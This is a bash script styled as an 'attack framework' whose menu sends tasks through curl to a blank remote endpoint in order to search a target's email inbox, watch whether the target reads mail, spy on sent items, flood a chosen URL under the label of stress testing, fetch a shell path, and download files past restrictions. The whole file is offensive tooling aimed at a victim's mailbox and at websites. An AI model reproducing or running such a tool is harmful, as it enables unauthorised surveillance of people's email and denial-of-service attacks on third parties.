#/usr/bin
clear
RequestFlow=""
Downloadbypass=""
while :
do
echo ""
echo ""
echo '		 ▒█████   ██▒   █▓ ██▀███    █████▒██▓     ▒█████   █     █░
		▒██▒  ██▒▓██░   █▒▓██ ▒ ██▒▓██   ▒▓██▒    ▒██▒  ██▒▓█░ █ ░█░
		▒██░  ██▒ ▓██  █▒░▓██ ░▄█ ▒▒████ ░▒██░    ▒██░  ██▒▒█░ █ ░█ 
		▒██   ██░  ▒██ █░░▒██▀▀█▄  ░▓█▒  ░▒██░    ▒██   ██░░█░ █ ░█ 
		░ ████▓▒░   ▒▀█░  ░██▓ ▒██▒░▒█░   ░██████▒░ ████▓▒░░░██▒██▓ 
		░ ▒░▒░▒░    ░ ▐░  ░ ▒▓ ░▒▓░ ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▓░▒ ▒  
		  ░ ▒ ▒░    ░ ░░    ░▒ ░ ▒░ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ▒ ░ ░  
		░ ░ ░ ▒       ░░    ░░   ░  ░ ░     ░ ░   ░ ░ ░ ▒    ░   ░  
		    ░ ░        ░     ░                ░  ░    ░ ░      ░    
	              ░          FLOW ATTACK FRAMEWORK 0.01                  '

	echo " 1) EMAIL OPTIONS"
	echo " 2) STRESS TEST A URL"
	echo " 3) SHELL"
	echo " 4) DOWNLOAD BYPASS"
	echo " 5) QUIT"
	read f 
	case $f in
	  1) while :
	  	 do
		 	clear
			echo " 1) SEARCH TARGET EMAIL"
			echo " 2) IS THE TARGET CHECKING THEIR EMAIL?"
			echo " 3) SPY ON THE TARGET SENT ITEMS"
			echo " 4) PHISH A TARGET"
			echo " 5) EXIT TO MENU"
			read g
			case $g in
				1) echo "Search The Targets Inbox. Type QUIT to Exit to Menu"
					while :
					do
						read -p ""  searchterm
						if [ $searchterm == QUIT ]
						then
							break
						fi
						curl -s -H "Content-Type: application/json" -X POST -d '{"Task":"Search","Term":"'$searchterm'"}' "$RequestFlow" | jq '.[]|{From,To,Subject,IsRead,Id} | with_entries( select( .value != null ) )'|  sed 's/{}/NO DATA FOUND/g'
					done;;
				2) curl -s -H "Content-Type: application/json" -X POST -d '{"Task":"Working","Term":"'$searchterm'"}' "$RequestFlow" | jq '.[]|{From,To,Subject,IsRead,DateTimeReceived,Id}'
	  			read -p "Press [Enter] key to continue...";;
				3) curl -s -H "Content-Type: application/json" -X POST -d '{"Task":"Sending","Term":"'$searchterm'"}' "$RequestFlow" | jq '.[]|{From,To,Subject,IsRead,DateTimeReceived,Id}'
				read -p "Press [Enter] key to continue...";;
				4) echo "not read";;
				5) break;;
	  			*) echo "Invalid option!";; 

		esac
		done;;
	
      2) read -p "What site are you wanting to stress test? Example https://some_nice_domain_to_check.com "  searchterm 
	  curl -s -H "Content-Type: application/json" -X POST -d '{"Task":"Stress","Term":"'$searchterm'"}' "$RequestFlow" > /dev/null 2>&1;;
	  3) curl -s -H "Content-Type: application/json" -X POST -d '{"Task":"Shell","Term":"'$searchterm'"}' "$RequestFlow" | jq '.[]|{Path}'| sed 's/{//g' | sed 's/}//g' | awk 'NF'
	  read -p "Press [Enter] key to continue...";;
	  4) read -p "What are you wanting to download? " searchterm
	  read -p "What is the file name and type? Example bad.zip " ftype
	  curl -s -H "Content-Type: application/json" -X POST -d '{"Task":"Download","Term":"'$searchterm'"}' "$Downloadbypass" -o $ftype ;;
	  5) break;;
	  *) echo "Invalid option!";; 
	esac
done



